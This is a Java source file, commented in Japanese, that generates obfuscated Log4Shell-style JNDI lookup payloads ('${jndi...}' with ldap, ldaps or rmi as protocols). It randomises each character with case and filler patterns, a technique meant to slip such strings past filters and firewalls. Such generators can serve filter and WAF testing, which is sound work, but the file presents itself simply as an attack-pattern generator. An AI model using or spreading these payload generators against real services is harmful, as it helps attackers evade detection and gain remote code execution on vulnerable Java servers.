package org.yuudai;

import com.google.common.base.CharMatcher;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 難読化された攻撃パターンを生成するクラス
 */
public class Obfuscator {
    /**
     * 各攻撃パターンの最初につける文字列
     */
    static final String first = "${";
    static final String jndi = "jndi://";
    static final String last = "}";
    /**
     * 攻撃パターンで使用するプロトコル
     */
    static final String[] protocols = {"ldap", "ldaps", "rmi"};

    static int repeat_limit = 20;

    static ArrayList<String> Obfuscate(ArrayList<String> obfuscations, String target, int num, boolean mixed) {
        target = jndi + target;
        ArrayList<String> output = new ArrayList<>();
        if (mixed) {
            for (int i = 0; i < num; i++) {
                StringBuilder generated = new StringBuilder();
                for (char ch : target.toCharArray()) {
                    generated.append(ObfuscateByChar(ch, ObfuscatorUtils.GetRandomString(obfuscations)));
                }
                output.add(first + generated + last);
            }
        } else {
            for (String obfuscation : obfuscations) {
                for (int i = 0; i < num; i++) {
                    StringBuilder generated = new StringBuilder();
                    for (char ch : target.toCharArray()) {
                        generated.append(ObfuscateByChar(ch, obfuscation));
                    }
                    output.add(first + generated + last);
                }
            }
        }
        return output;
    }

    static String ObfuscateByChar(char ch, String method) {
        boolean upper = false;
        boolean lower = false;
        int more_than = -1;
        ArrayList<Character> others = new ArrayList<>();
        Pattern pattern = Pattern.compile("<.{1,3}>[+*]");
        Matcher matcher = pattern.matcher(method);
        String tmp = "";

        while (matcher.find()) {
            upper = false;
            lower = false;
            more_than = -1;
            others.clear();

            if (matcher.group().contains("A")) {
                upper = true;
            }
            if (matcher.group().contains("a")) {
                lower = true;
            }
            if (matcher.group().charAt(matcher.group().length() - 1) == '+') {
                more_than = 1;
            }
            if (matcher.group().charAt(matcher.group().length() - 1) == '*') {
                more_than = 0;
            }
            Pattern other = Pattern.compile("[^+*<>Aa0]");
            Matcher matcher_other = other.matcher(matcher.group());
            while (matcher_other.find()) {
                for (char element : matcher_other.group().toCharArray()) {
                    others.add(element);
                }
            }
            String remaining = method.replaceFirst("<.{1,3}>[+*]", "%");
            tmp = CharMatcher.is('%').replaceFrom(remaining, Generate(upper, lower, more_than, others));
        }
        if (!tmp.isEmpty()) {
            String remaining = tmp.replaceFirst("<.{1,3}>[+*]", "%");
            String tmp2 = CharMatcher.is('%').replaceFrom(remaining, Generate(upper, lower, more_than, others));
            return CharMatcher.is('#').replaceFrom(tmp2, ch);
        } else {
            return CharMatcher.is('#').replaceFrom(method, ch);
        }
    }

    static String Generate(boolean upper, boolean lower, int more_than, ArrayList<Character> others) {
        StringBuilder sb = new StringBuilder();
        ArrayList<Character> candidates = new ArrayList<>();
        if (upper) {
            for (int i = 0; i < 26; i++) {
                candidates.add((char) ('A' + i));
            }
        }
        if (lower) {
            for (int i = 0; i < 26; i++) {
                candidates.add((char) ('a' + i));
            }
        }
        if (!others.isEmpty()) {
            candidates.addAll(others);
        }
        int repeats = (int)(Math.random() * repeat_limit + 0.5) + more_than;
        for (int i = more_than; i < repeats; i++){
            sb.append(ObfuscatorUtils.GetRandomChar(candidates));
        }
        return sb.toString();
    }
}
